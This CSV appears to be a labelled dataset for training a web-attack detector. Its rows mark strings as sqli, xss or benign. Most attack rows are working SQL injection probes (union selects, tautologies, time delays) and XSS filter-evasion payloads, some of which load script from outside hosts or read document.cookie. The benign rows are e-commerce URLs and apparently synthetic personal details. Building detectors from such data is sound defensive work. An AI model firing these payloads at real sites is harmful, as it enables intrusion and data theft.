payload,type
"sUE1n: select * from users where id='1' union select 1a,banner from v$version where rownum=1 -- 1'",sqli
"s&.oU: select * from users where id='1' or \.<\ union select 1,@@VERSION -- 1'",sqli
"sUEo.: select * from users where id='1' union select +\.,@@VERSION -- 1'",sqli
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",xss
"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",xss
"svUE1: select * from users where id=1 or 1#""@ union select 1,version() -- 1",sqli
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
a' or '345'='345,sqli
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"plaa del mercat, 198 7-c",benign
"s&.o1: select * from users where id='1' or \.<1 union select 1,@@VERSION -- 1'",sqli
<img src ?itworksonchrome?\/onerror = alert(1),xss
miembros/salir.jsp,benign
imagenes/logo.gif,benign
ezequas,benign
"<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<img \x12src=x onerror=""javascript:alert(1)"">",xss
eddier,benign
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,xss
global/creditos.jsp,benign
&oo1&: select * from users where id=1 or \< =1 or 1=1 -- 1,sqli
<script ~~~>alert(0%0)</script ~~~>,xss
63829565b,benign
publico/registro.jsp?modo=registro&login=mollerus&password=1capa2ad*or&nombre=Jorgelina&apellidos=Romanov+Xandri&email=bonyadi-pedro%40programa-gestion-erp.bv&dni=20914276P&direccion=Masia+Can+Giro%2C+5+&ciudad=Puente+del+Congosto&cp=33776&provincia=Lleida&ntc=0332806980099354&B1=Registrar,benign
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
".o1c: select * from users where id=1.<1# union select 1,version() -- 1",sqli
".&1UE: select * from users where id=1.&&1 union select 1,version() -- 1",sqli
"<a href=""\x1Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"s(UEs: select * from users where id=1 or 1#""( union select 'a',version() -- 1",sqli
" or "" ",sqli
ov&1c: select * from users where id=1 &@ or 1=1 -- 1,sqli
"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
5659,benign
imagenes/1.gif,benign
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
"sn(s: select * from users where id=1 or ""$("" or 1=1 -- 1",sqli
<img/src=@&#32;&#13; onerror = prompt('&#49;'),xss
"s.(s: select * from users where id=1 or "".("" or 1=1 -- 1",sqli
<IMG SRC=javascript:alert('XSS')>,xss
"s.,s: select * from users where id=1 or "".,"" or 1=1 -- 1",sqli
"admin"") or (""1""=""1""--",sqli
imagenes/2.gif,benign
9362,benign
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=92&B1=A%F1adir+al+carrito,benign
"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",xss
"s1)s: select * from users where id=1 or ""1)"" or 1=1 -- 1",sqli
.on&1: select * from users where id=1.<@$ or 1=1 -- 1,sqli
"<script src=""javascript:alert(1)"">",xss
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",xss
2 order by 9999,sqli
"s?n: select * from users where id=1 or ""?["" or 1=1 -- 1",sqli
"UE1n: select * from users where id=1 union select 1`\`,version() -- 1",sqli
index.jsp,benign
necforo,benign
"s;UEf: select * from users where id=1 or 1#""; union select version(),version() -- 1",sqli
'^',sqli
torreblacos,benign
imagenes/logo.gif,benign
"n.UEv: select * from users where id=1 +$ . union select null,@@VERSION -- 1",sqli
"<img \x11src=x onerror=""javascript:alert(1)"">",xss
miembros/imagenes/ogono.jpg,benign
"1oUEv: select * from users where id=1 +1<@ union select null,version() -- 1",sqli
<BODY ONLOAD=alert('XSS')>,xss
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",xss
"s&(.): select * from users where id='1' or (\.)=1 union select 1,@@VERSION -- 1'",sqli
admin') or '1'='1,sqli
"""`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",xss
"sUE(1: select * from users where id='1' union select (1),banner from v$version where rownum=1 -- 1'",sqli
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=62&B1=A%F1adir+al+carrito,benign
"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",xss
index.jsp,benign
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
"s{1s: select * from users where id=1 or ""{1""=1 or 1=1 -- 1",sqli
forfoleda,benign
"s;os: select * from users where id=1 or "";&"" or 1=1 -- 1",sqli
"s(v: select * from users where id=1 or ""(@"" or 1=1 -- 1",sqli
"s??s: select * from users where id=1 or ""??"" or 1=1 -- 1",sqli
publico/pagar.jsp?modo=insertar&precio=2306&B1=Pasar+por+caja,benign
imagenes/cmenbul.gif,benign
miramar,benign
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss
so.n&: select * from users where id='1' <@.$ or 1=1 -- 1',sqli
' or ''*',sqli
deying,benign
a' order by 1#,sqli
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
"voUE1: select * from users where id=1 -@<@ union select 1,version() -- 1",sqli
"s.o1U: select * from users where id=1 or 1#"".=1 union select 1,version() -- 1",sqli
' or '' ',sqli
"<IMG SRC=""javascript:alert('XSS')""",xss
"soos: select * from users where id=1 or ""%&"" or 1=1 -- 1",sqli
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",xss
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",xss
"456""%5d|//a|/a%5b""a",sqli
<a onmouseover=alert(document.cookie)>xxs link</a>,xss
publico/pagar.jsp?modo=insertar&precio=6684&B1=Pasar+por+caja,benign
"admin"") or ""1""=""1""#",sqli
"&1UEv: select * from users where id=1 ||1 union select null,banner from v$version where rownum=1 -- 1",sqli
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss
79144797a,benign
6769,benign
"so{s: select * from users where id=1 or ""%{"" or 1=1 -- 1",sqli
"a"" order by 9999-- #",sqli
"<script src=""data:text/javascript,alert(1)""></script>",xss
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
"<IMG DYNSRC=""javascript:javascript:alert(1)"">",xss
<embed code=javascript:javascript:alert(1);></embed>,xss
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
publico/autenticar.jsp?modo=entrar&login=holdaway&pwd=TAbuRETe&remember=on&B1=Entrar,benign
1&1c: select * from users where id=1 +1 or 1=1 -- 1,sqli
miembros/index.jsp,benign
publico/miembros.jsp,benign
saviange_files@zytel.nc,benign
"c/ fuente del peral 41,",benign
"'`""><\x3Cscript>javascript:alert(1)</script>",xss
"sUE(.: select * from users where id='1' union select (\.),@@VERSION -- 1'",sqli
"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"sUE,v: select * from users where id='1' union select \,@@VERSION -- 1'",sqli
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss
"<script src=""/\%(jscript)s""></script>",xss
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
global/creditos.jsp,benign
"c/ virgen de la almudena, 61 12?c",benign
"sov1o: select * from users where id='1' + @ 1! union select 1,version() -- 1'",sqli
trigueros del valle,benign
"s1n: select * from users where id=1 or ""1["" or 1=1 -- 1",sqli
"<img\x47src=x onerror=""javascript:alert(1)"">",xss
"s&vvU: select * from users where id='1' or @ @1=1 union select 1,version() -- 1'",sqli
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss
"<img src\x10=x onerror=""javascript:alert(1)"">",xss
"s.n: select * from users where id=1 or "".["" or 1=1 -- 1",sqli
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss
16340,benign
".UE1,: select * from users where id=1.  union select 1,version() -- 1",sqli
publico/pagar.jsp?modo=insertar&precio=7205&B1=Confirmar,benign
85802086b,benign
<object onerror=javascript:javascript:alert(1)>,xss
"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",xss
37130,benign
"&onUE: select * from users where id=1 or \<$ union select 1,@@VERSION -- 1",sqli
index.jsp,benign
a' order by 1--,sqli
"s:(s: select * from users where id=1 or "":(""=1 or 1=1 -- 1",sqli
"s.UEs: select * from users where id=1 or 1#"". union select 'a',version() -- 1",sqli
".)UEv: select * from users where id=1 + (\.) union select null,@@VERSION -- 1",sqli
"&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1",sqli
<embed code=%(scriptlet)s></embed>,xss
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
"s;1s: select * from users where id=1 or "";1"" or 1=1 -- 1",sqli
"snv: select * from users where id=1 or ""$@"" or 1=1 -- 1",sqli
imagenes/cmenbul.gif,benign
"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss
"s(c: select * from users where id=1 or ""(#"" or 1=1 -- 1",sqli
"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",xss
imagenes/cmenbul.gif,benign
"sUE1k: select * from users where id='1' union select 1,banner from v$version where rownum=1 -- 1'",sqli
imagenes/logo.gif,benign
<iframe src=%(scriptlet)s <,xss
<<SCRIPT>%(payload)s//<</SCRIPT>,xss
s&o.&: select * from users where id='1' or \<\. or 1=1 -- 1',sqli
"&(.)o: select * from users where id=1 or (\.)=1 union select 1,@@VERSION -- 1",sqli
"s&1oo: select * from users where id='1' or 1^=1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
<STYLE>@import'%(css)s';</STYLE>,xss
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",xss
publico/miembros.jsp,benign
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",xss
<script>javascript:alert(1)<\x00/script>,xss
publico/miembros.jsp,benign
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss
"""`'><script>\xE2\x80\x84javascript:alert(1)</script>",xss
7150,benign
miembros/imagenes/castro.jpg,benign
"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",xss
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",xss
"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",xss
"s:&1c: select * from users where id=1 or 1#"": or 1=1 -- 1",sqli
global/titulo.jsp,benign
".UEf(: select * from users where id=1.  union select version(),version() -- 1",sqli
"admin"" or ""1""=""1",sqli
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss
"snc: select * from users where id=1 or ""$#"" or 1=1 -- 1",sqli
"<img src=x onerror=\x12""javascript:alert(1)"">",xss
<script>javascript:alert(1)</script>,xss
miembros/imagenes/castro.jpg,benign
"s&n.o: select * from users where id='1' or $ .=1 union select 1,@@VERSION -- 1'",sqli
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
"noonU: select * from users where id=1 + $+*$ union select null,@@VERSION -- 1",sqli
"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",xss
"admin"" #",sqli
vilma,benign
"s;,s: select * from users where id=1 or "";,""=1 or 1=1 -- 1",sqli
"son: select * from users where id=1 or ""%["" or 1=1 -- 1",sqli
publico/productos.jsp,benign
<iframe/%00/ src=javaSCRIPT&colon;alert(1),xss
<%<!--'%><script>alert(1);</script -->,xss
3.35E+15,benign
"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",xss
"<video onerror=""javascript:javascript:alert(1)""><source>",xss
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
"s:?s: select * from users where id=1 or "":]"" or 1=1 -- 1",sqli
"1UE1k: select * from users where id=1 +1 union select 1,banner from v$version where rownum=1 -- 1",sqli
"345"")%5d|//*|/a%5bcontains(a,""b",sqli
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",xss
.&1c: select * from users where id=1. or 1=1 -- 1,sqli
")UEvc: select * from users where id=1 +(\) union select null,@@VERSION -- 1",sqli
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
"a"" or ""dfth""=""dfth""-- #",sqli
"1ooUE: select * from users where id=1 + \+*\ union select null,@@VERSION -- 1",sqli
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,xss
publico/carrito.jsp,benign
<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",xss
"sUE.,: select * from users where id='1' union select \.,@@VERSION -- 1'",sqli
"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",xss
eu,benign
"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<iframe  src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
1o)&1: select * from users where id=1 + (\+) or 1=1 -- 1,sqli
"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",xss
"<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",xss
global/menum.jsp,benign
publico/vaciar.jsp?B2=Vaciar+carrito,benign
"s&n1U: select * from users where id='1' or $ 1=1 union select 1,@@VERSION -- 1'",sqli
navas de jorquera,benign
15317,benign
"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",xss
"sv:s: select * from users where id=1 or ""@:""=1 or 1=1 -- 1",sqli
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=15&B1=A%F1adir+al+carrito,benign
"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",xss
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",xss
"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",xss
"s.ns: select * from users where id=1 or ""._"" or 1=1 -- 1",sqli
"os: select * from users where id=1 <@$$ union select 1,version() -- 1",sqli
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",xss
"sov(1: select * from users where id='1' + @(1) union select 1,version() -- 1'",sqli
"<img src=# onerror\x3D""javascript:alert(1)"" >",xss
"admin"") or ""1""=""1""/*",sqli
miembros/imagenes/castro.jpg,benign
no)&1: select * from users where id=1 + ($+) or 1=1 -- 1,sqli
<script\x0C>javascript:alert(1)</script>,xss
"noo1U: select * from users where id=1 + $+%1 union select null,@@VERSION -- 1",sqli
"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",xss
"so1&1: select * from users where id='1' + 1||1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
o.n&1: select * from users where id=1 <@.$ or 1=1 -- 1,sqli
"456')%5d|//a|/a%5bcontains(a,'b",sqli
imagenes/cmenbul.gif,benign
publico/miembros.jsp,benign
no.&1: select * from users where id=1 +$+. or 1=1 -- 1,sqli
publico/caracteristicas.jsp?id=1,benign
"s{os: select * from users where id=1 or ""{%"" or 1=1 -- 1",sqli
"\"";alert('XSS');//",xss
imagenes/logo.gif,benign
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"snn: select * from users where id=1 or ""$["" or 1=1 -- 1",sqli
s&.o&: select * from users where id='1' or \.<\ or 1=1 -- 1',sqli
"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",xss
"s;UEv: select * from users where id=1 or 1#""; union select null,version() -- 1",sqli
imagenes/3.gif,benign
"s?UE1: select * from users where id=1 or 1#""? union select 1,version() -- 1",sqli
1 waitfor delay '0:0:X'--,sqli
"1)UEv: select * from users where id=1 +(1) union select null,banner from v$version where rownum=1 -- 1",sqli
lu,benign
5366,benign
1); waitfor delay '0:0:X'--,sqli
on&1c: select * from users where id=1 <@$ or 1=1 -- 1,sqli
"s1{s: select * from users where id=1 or ""1{"" or 1=1 -- 1",sqli
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"1' or benchmark(100000000,MD5(1))#",sqli
<body/onload=&lt;!--&gt;&#10alert(1)>,xss
"<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
global/titulo.jsp,benign
<script\x09>javascript:alert(1)</script>,xss
index.jsp,benign
"sn:s: select * from users where id=1 or ""$:"" or 1=1 -- 1",sqli
valido casademont,benign
36823414t,benign
siefert,benign
"s1UEs: select * from users where id=1 or 1#""1 union select 'a',version() -- 1",sqli
admin' or '1'='1'/*,sqli
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,xss
6.19E+15,benign
miembros/salir.jsp,benign
"1oUE1: select * from users where id=1 -1<@ union select 1,version() -- 1",sqli
imagenes/1.gif,benign
"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
vidrioso,benign
<iframe/onreadystatechange=alert(1),xss
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
"<img src\x47=x onerror=""javascript:alert(1)"">",xss
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>,xss
dziawa,benign
"so.s: select * from users where id=1 or ""%."" or 1=1 -- 1",sqli
"s;:s: select * from users where id=1 or "";:""=1 or 1=1 -- 1",sqli
"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",xss
"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
"""`'><script>\x00javascript:alert(1)</script>",xss
"<img src=x\x09onerror=""javascript:alert(1)"">",xss
"s:os: select * from users where id=1 or "":%"" or 1=1 -- 1",sqli
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss
"ooUE1: select * from users where id=1<@<@ union select 1,version() -- 1",sqli
"&(1UE: select * from users where id=1 or (\+)=1 union select 1,@@VERSION -- 1",sqli
"1oonU: select * from users where id=1 + \+*$ union select null,@@VERSION -- 1",sqli
"<form><isindex formaction=""javascript&colon;confirm(1)""",xss
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",xss
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",xss
"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
n.&1c: select * from users where id=1 +$ . or 1=1 -- 1,sqli
miembros/salir.jsp,benign
<STYLE>@import'%(css)s';</STYLE>,xss
imagenes/2.gif,benign
1')); waitfor delay '0:0:X'--,sqli
".&vUE: select * from users where id=1.&&@ union select 1,version() -- 1",sqli
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-",xss
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
40355743n,benign
miembros/index.jsp,benign
"<LINK REL=""stylesheet"" HREF=""javascript:javascript:alert(1);"">",xss
pingajosa,benign
"sUE(): select * from users where id='1' union select (\),@@VERSION -- 1'",sqli
"<IMG SRC=javascript:alert(""XSS"")>",xss
"&noo1: select * from users where id=1 or $+<1 union select 1,@@VERSION -- 1",sqli
ulrico,benign
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,xss
"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1)"">DEF",xss
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
"s&()o: select * from users where id='1' or (\)=1 union select 1,@@VERSION -- 1'",sqli
"s&no.: select * from users where id='1' or $<\. union select 1,@@VERSION -- 1'",sqli
".UE1k: select * from users where id=1. union select 1,banner from v$version where rownum=1 -- 1",sqli
duesaiges,benign
"ABC<div style=""x:\x0Cexpression(javascript:alert(1)"">DEF",xss
"""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",xss
imagenes/2.gif,benign
"""`'><script>\xE2\x80\x81javascript:alert(1)</script>",xss
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss
"<embed type=""image"" src=%(scriptlet)s></embed>",xss
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
2/0 and 456=678,sqli
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=83&B1=A%F1adir+al+carrito,benign
"<a href=""jav&#97ascript:javascript:alert(1)"">test1</a>",xss
"o.nUE: select * from users where id=1 <@.$ union select 1,version() -- 1",sqli
a'or/*g*/345=345-- #,sqli
"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",xss
miembros/imagenes/castro.jpg,benign
<img src=`xx:xx`onerror=alert(1)>,xss
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​,xss
"voUEf: select * from users where id=1 -@<@ union select version(),version() -- 1",sqli
"admin"") or (""1""=""1""#",sqli
alkin@lesionesmusculares.pf,benign
"o1UEv: select * from users where id=1 *1 union select null,banner from v$version where rownum=1 -- 1",sqli
"s&o1U: select * from users where id='1' or !<1 union select 1,version() -- 1'",sqli
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"s{:s: select * from users where id=1 or ""{:"" or 1=1 -- 1",sqli
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",xss
"&n.o1: select * from users where id=1 or $ .=1 union select 1,@@VERSION -- 1",sqli
"&.oUE: select * from users where id=1 or \.<\ union select 1,@@VERSION -- 1",sqli
"s{c: select * from users where id=1 or ""{#"" or 1=1 -- 1",sqli
"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss
<script\x0D>javascript:alert(1)</script>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,benign
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",xss
miembros/fotos.jsp,benign
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
imagenes/nuestratierra.jpg,benign
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},xss
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
"UE1nn: select * from users where id=1 union select .1$_,version() -- 1",sqli
imagenes/cmenbul.gif,benign
"<SCRIPT SRC=""%(jpg)s""></SCRIPT>",xss
"sv(s: select * from users where id=1 or ""@("" or 1=1 -- 1",sqli
"<xml id=""xss"" src=""%(htc)s""></xml> <label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>",xss
' or ''^',sqli
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,xss
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=66&B1=A%F1adir+al+carrito,benign
